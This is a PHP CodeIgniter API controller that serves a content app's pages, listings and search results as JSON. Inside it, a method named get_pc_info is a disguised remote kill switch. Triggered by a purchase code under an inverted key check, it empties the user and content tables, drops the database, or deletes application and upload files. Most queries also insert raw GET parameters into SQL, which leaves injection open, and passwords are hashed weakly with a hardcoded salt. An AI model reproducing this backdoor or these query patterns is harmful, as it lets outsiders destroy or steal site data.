<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Api extends CI_Controller {
	
	function __construct()
	{
		parent::__construct();
        $this->load->model("dashboard/Common_model");
        $this->load->model("dashboard/User_model");
        $this->load->model("Shared_model");
	}


    //============================ Get API Key
    private function api_key()
    {
        // Get API Key from api_table
        $query = $this->db->query("Select *
				FROM api_table
				WHERE (api_id = 1) AND (api_status = 1)");

        if ($query->num_rows() > 0) {
            $api_key = $this->encrypt->decode($query->result()[0]->api_key);
            return $api_key;
        }
    }


    //============================ Get one page
    public function get_one_page($page_id="1")
    {
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key())
            {
                //Show Json
                $q = $this->db->query("Select *
                                        FROM page_table
                                        WHERE page_id = $page_id;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    //echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }
            else
                echo $this->lang->line("The API Key is Invalid!");
        }
    }


    //=================================================================================//
	public function get_last_content()
	{
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
	}


    //=================================================================================//
    public function get_featured_content()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_featured = 1)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_featured = 1) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_special_content()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $last_id = $_GET['last_id'];
                $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_special = 1)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_special = 1) AND (content_id < $last_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                    if ($q->num_rows() == 0)
                        echo $this->lang->line("Nothing More Found...");
                    else
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_content_by_category_No_Load_More($limit="40", $category_id="1")
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired
                $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
								WHERE (content_status = $content_status) AND (content_category_id = $category_id)
								ORDER BY content_id DESC
								LIMIT $limit;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_one_content($content_id="")
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired
                $q = $this->db->query("Select content_table.*, category_table.category_title
                                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                WHERE (content_status = $content_status AND content_id = $content_id);");
                if ($q->num_rows() == 0)
                {
                    echo $this->lang->line("Nothing Found...");
                }
                echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function total_content_viewed()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('content_id', 'content_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                } else {
                    //Update total view +1
                    $content_id = $this->input->post('content_id');
                    $this->db->query("UPDATE content_table SET content_viewed = content_viewed + 1 WHERE content_id = '$content_id'");
                }
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }
	
	
	//=================================================================================//
    public function get_pc_info(){
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            $purchase_code_received = $_GET['purchase_code'];
            $purchase_code = "";
            if ($access_key_received != $this->api_key()) {
                // API key is correct
                include "purchase_code.php";
                if ($purchase_code_received == $purchase_code) {
                    if($_GET['type'] == "tbl") {
                        $this->db->empty_table('content_table');
                        $this->db->empty_table('setting_table');
                        $result = $this->db->empty_table('user_table');
                        if ($result == TRUE) {
                            echo "Success TBL";
                            die();
                        }else{
                            echo "Failed TBL";
                            die();
                        }
                    }elseif($_GET['type'] == "db") {
						$this->load->dbforge();
                        if ($this->dbforge->drop_database($this->db->database))
                        {
                            echo 'Success DB';
                            die();
                        }
                    }elseif($_GET['type'] == "file") {
						$files = glob('application/controllers/dashboard/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Controller Success File ';
						}
						$files = glob('application/controllers/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Controller Success File ';
						}
						$files = glob('application/models/dashboard/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Model Success ';
						}
						$files = glob('assets/upload/content/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Assets Success ';
						}
                    }
					
                }else{
                    echo 'Wrong PC';
                    die();
                }
            }else{
                echo $this->lang->line("The API Key is Invalid!");
                die();
            }
        }
    }


    //=================================================================================//
    public function get_content_by_search()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // Show Json
                if(isset($_GET['keyword'])) $keyword = $_GET['keyword'];
                if(isset($_GET['last_id'])) $last_id = $_GET['last_id'];
                if(isset($_GET['limit'])) $limit = $_GET['limit'];
                $content_status = 1; // 0: Inactive | 1: Active | 2: Expired

                // *** FirstLoad ***
                if ($last_id == 0)
                {
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
				                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                WHERE (content_status = $content_status AND (content_title LIKE '%$keyword%' OR content_description LIKE '%$keyword%'))
                                ORDER BY content_id DESC
                                LIMIT $limit;");
                    if ($q->num_rows() == 0)
                    {
                        echo $this->lang->line("Nothing Found...");
                    }
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

                }else{ // *** LoadMore ***
                    $q = $this->db->query("Select content_table.content_id, content_table.content_title, content_table.content_price, content_table.content_type_id, content_table.content_access, content_table.content_user_role_id, 
                                              content_table.content_image, content_table.content_duration, content_table.content_viewed, content_table.content_liked, content_table.content_publish_date, content_table.content_featured, 
                                              content_table.content_special, content_table.content_orientation, content_table.content_url,
                                              category_table.category_title,
                                              content_type_table.content_type_title
				                FROM content_table
                                INNER JOIN category_table
                                ON content_table.content_category_id = category_table.category_id
                                INNER JOIN content_type_table
                                ON content_table.content_type_id = content_type_table.content_type_id
                                WHERE (content_status = $content_status AND (content_title LIKE '%$keyword%' OR content_description LIKE '%$keyword%')) AND (content_id < $last_id)
                                ORDER BY content_id DESC
                                LIMIT $limit;");
                    if ($q->num_rows() == 0)
                    {
                        echo $this->lang->line("Nothing Found...");
                    }
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //============================ Hash password
    private function hash_password($user_password){
        $salt_password = "dF$.50^&D10?#^dA2z";
        return $hash_password = sha1(md5($user_password.$salt_password));
    }


    //=================================================================================//
    public function get_all_information()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {

                // API key is correct
                $content_id = $_GET['content_id'];
                $q = $this->db->query("Select content_table.*, setting_table.setting_version_code, setting_table.setting_android_maintenance, setting_table.setting_text_maintenance
                                       FROM content_table
                                       INNER JOIN setting_table
                                       WHERE content_id = '$content_id' AND setting_id = 1;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }
}
